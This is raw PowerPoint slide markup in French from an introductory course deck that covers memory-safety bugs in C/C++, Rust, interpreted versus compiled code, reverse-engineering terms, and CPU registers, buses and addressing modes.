            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> C ?</a:t>
            </a:r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21B4A4-15DD-0B0F-E61C-ABC53EF62D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2360122"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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80987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91D60D-1487-276B-871A-AD05C100F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Rust : Le langage sécurisé par conception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AC17B-914A-ABDD-9880-C317A607C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3660" y="762000"/>
            <a:ext cx="6518340" cy="5334000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr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Problèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>langages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>traditionnels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En C et C++, les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>erreurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>liées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à la gestion </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>manuelle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (buffer overflows, use-after-free, double free, etc.)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courantes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Ces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>erreurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>principales</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sources de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilités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9568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C95FB-D509-408E-A75D-965B400C7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68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22D4A-28F3-99FE-3F34-CE3C458F6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 dirty="0"/>
              <a:t>Rust : Le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>langage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par conception</a:t>
            </a:r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012D72-87B4-82A0-3316-A8455CB3B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710225"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6857999" y="762000"/>
          <a:ext cx="4543197" cy="5393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41050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AA09-5D72-D5AB-1CF7-995AFBD2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Rust : Le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>langage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par conception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826AB-0542-98A5-53BF-9B33C17E9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Adoption </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>croissante</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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err="1"/>
              <a:t>Utilisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>projets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le Kernel Linux (dans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moindre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mesure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>actuellement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>) et des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>entreprises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Microsoft pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réécrire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>composants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> critiques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Citation :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t>Rust </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>est</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>conçu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>éliminer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> les classes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>entières</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>avant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>même</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0" err="1"/>
              <a:t>l’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" i="1" dirty="0"/>
              <a:t> du code.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>"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1210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fr-FR" sz="900"/>
              <a:t>Terminologies – Software</a:t>
            </a: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code source à résultat « interprété »</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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mécanisme d’interprétation d’un code source en claire afin de le traduire en instruction machine à la volée</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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exemples : Python, PHP, VB, JavaScript</a:t>
            </a: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code source à résultat « compilé »</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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mécanisme de transformation d’un code source en claire vers un fichier exécutable appelé « binaire » (PE / ELF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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exemples : C, C++, D, Go, Rust</a:t>
            </a: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code source résultant un « bundle »</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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mécanisme de transformation d’un code source non compilable vers un fichier exécutable et transportable (« autosuffisant ») appelé « bundle » (PE / ELF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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applique de la « transpilation » vers du « Byte Code »</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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exemple : C#, Java</a:t>
            </a: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rétro-ingénierie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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étude d’un logiciel afin de comprendre son fonctionnement interne ainsi que sa construction</a:t>
            </a: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Désassemblage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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mécanisme de rétro. permettant de transformer du code assembleur en langage de plus haut niveau (équivalence en C en générale)</a:t>
            </a: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Décompilation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="9715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mécanisme de rétro. permettant de transformer un fichier binaire en code assembleur</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="6286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Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="2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900"/>
              <a:t>mécanisme de transformation d’un code source lisible en une version moins compréhensible par</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="900"/>
              <a:t>un humain (opération réversible)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1137246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7DD8518-4289-43CE-9E36-8E7E0D7DD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17104EE-9577-4271-9870-7BB592A35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7" y="762001"/>
            <a:ext cx="4991103" cy="1141004"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Introduction – Interprété</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Espace réservé du contenu 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FB4F66A1-84A5-6A07-F415-D16569366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459" y="1691094"/>
            <a:ext cx="7815448" cy="490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799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7DD8518-4289-43CE-9E36-8E7E0D7DD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17104EE-9577-4271-9870-7BB592A35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7" y="762001"/>
            <a:ext cx="4991103" cy="1141004"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Introduction – compilé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B1AF7B1-9A46-4D4E-A37F-0AEFD4BAAE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211" y="1326142"/>
            <a:ext cx="7508789" cy="538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75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7DD8518-4289-43CE-9E36-8E7E0D7DD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17104EE-9577-4271-9870-7BB592A35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7" y="762001"/>
            <a:ext cx="4991103" cy="1141004"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Introduction – bundle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876589C2-C976-417E-9A02-DAFF9E0ED8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497859" y="1055265"/>
            <a:ext cx="7432389" cy="553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12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218290-08E7-4AB8-8549-F625B01F0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BBFF4-49CC-092A-B31F-6514B6178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7" y="762001"/>
            <a:ext cx="5333365" cy="1141004"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Introduction au </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB"/>
              <a:t>langage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB"/>
              <a:t>assembleur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9B5B4-C428-E2C5-23BB-024C8D601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25" y="2259698"/>
            <a:ext cx="5960076" cy="383630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Qu’est-ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> que </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>l’assembleur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> ?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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>langage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de bas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>niveau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>interprété</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>processeur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Liens directs avec le code machine (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire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Utilité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Manipulation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>précise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des instructions.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Compréhension</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>débordements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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Analyse de malware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9A9457-874F-4EEB-BF07-9CEA561C1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9965" y="1114197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23E95063-5A9E-A492-BB24-0062ACD58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6075" y="1890308"/>
            <a:ext cx="3077384" cy="307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528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218290-08E7-4AB8-8549-F625B01F0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B2DE0-560C-8E76-173A-37663621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7" y="762001"/>
            <a:ext cx="5333365" cy="1141004"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB"/>
              <a:t>Fonctionnement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> d’un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB"/>
              <a:t>processeur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290CA-BCD1-7E15-41A0-0B6149FC4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7" y="2259698"/>
            <a:ext cx="4991103" cy="3836301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Les bases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Unité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> centrale de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>traitement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> (CPU)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Exécute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les instructions machine.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Éléments-clés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Registres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : stockage </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>temporaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des données.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Bus : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>transfert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des données entre les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>composants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Instructions : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>opérations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arithmétiques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>logiques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contrôle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9A9457-874F-4EEB-BF07-9CEA561C1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9965" y="1114197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ubtitles">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF205D59-E3EF-0FC1-ED46-FE6923E5D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16075" y="1890308"/>
            <a:ext cx="3077384" cy="307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235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598DCE-49A4-46FC-89A2-87E971ABE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448D61-FD92-4997-B065-20433412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4" name="Oval 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED903D6B-9D52-4138-9E24-EB3F7AFA8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17864" y="760144"/>
            <a:ext cx="5356272" cy="5356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71AD2-930B-C822-22CE-F617C19F3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717" y="1746913"/>
            <a:ext cx="4162567" cy="18833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Les éléments-clés d’un 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FA814-5741-F0FC-38FF-1D05582C6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275" y="4290867"/>
            <a:ext cx="3217451" cy="131835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/>
              <a:t>Les briques fondamentales du CPU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51A8F8-7445-4C49-926D-816D68765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777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1A97E-1D40-B93A-0537-B12C59379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Registres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1CFCA9-54FC-6EF9-2A6A-7EFC66F08D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8931962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73909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3FF87-C9BA-775B-822E-DDED1438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Bus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4161F7-9E87-4340-AEEC-E4CBFE473E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3097454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11138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E09F2-2D7D-D661-6FBD-E5E275BBB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Instructions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BA50BF-349C-50A2-0AF9-E43731A66C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959574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25559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4D0B9-08FE-7ECE-163E-5E89262CF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Résumé des fondamentaux du CPU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7F29D-033D-C5DF-17DC-FEFABE5F1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/>
              <a:t>Le CPU,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combinant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, bus et instructions, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réalise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>toutes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>opérations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>essentielles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> d’un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ordinateur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>gèrent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les données à court </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>terme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Les bus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>assurent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la communication </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rapide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> entre les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>composants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Les instructions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dictent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le travail du CPU.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92491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2D3FF-9119-1945-D3CE-BD7C25E09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Les concepts de l’encodage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4D8F0-5FB5-9E66-CA20-01CC345A9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/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Modes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d’adressage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1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Accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à travers des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registres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des offsets.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Exemples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Adressage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>immédiat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>directement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’instruction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Adressage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> indirect : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>référence</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pointeur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82059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9F72C-E3FB-4C48-AEBD-AF7AC0D74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DE77F2-18D0-49FF-860C-62E2AC424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A1A39-DC1A-6122-9570-9AA16B4A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180" y="1524000"/>
            <a:ext cx="4009639" cy="3810000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>Instructions et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>opérations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="000000"/>
                </a:highlight>
              </a:rPr>
              <a:t>assembleur</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR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47B69-FDBB-319B-E519-442693FD6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680" y="762000"/>
            <a:ext cx="3897332" cy="3154154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Types </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d’instructions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Arithmétique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : addition, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>soustraction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Logique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : AND, OR, XOR.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Contrôle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : sauts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>conditionnels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>appels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions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2C484-1B55-35EA-8FC2-B7210A857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4669433"/>
            <a:ext cx="6389975" cy="218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119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C95FB-D509-408E-A75D-965B400C7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68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27438-35EB-65D0-A202-0AFE6A1F8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 dirty="0"/>
              <a:t>Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>processeur</a:t>
            </a:r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82BD8F-85A1-B37B-D607-CF6DEA839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3563314"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6857999" y="762000"/>
          <a:ext cx="4543197" cy="5393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42990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E23CD-9D0D-B420-52FB-B4C928061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Différents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> types </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’opérations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FA9C5-C777-E245-586F-979C31A41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Arithmétique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ADD, SUB.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Logique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OR, AND, XOR.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D43282-C4E4-AEB8-D456-7404715B2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83" y="4135395"/>
            <a:ext cx="7772400" cy="30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351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18AAF-3847-85BE-2060-F5879DF6C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Modes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'adressage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : Étude </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>approfondie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104FA-3ED3-B715-8725-22F8A79D9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Adressage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>relatif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Utilisation d’un offset pour </a:t>
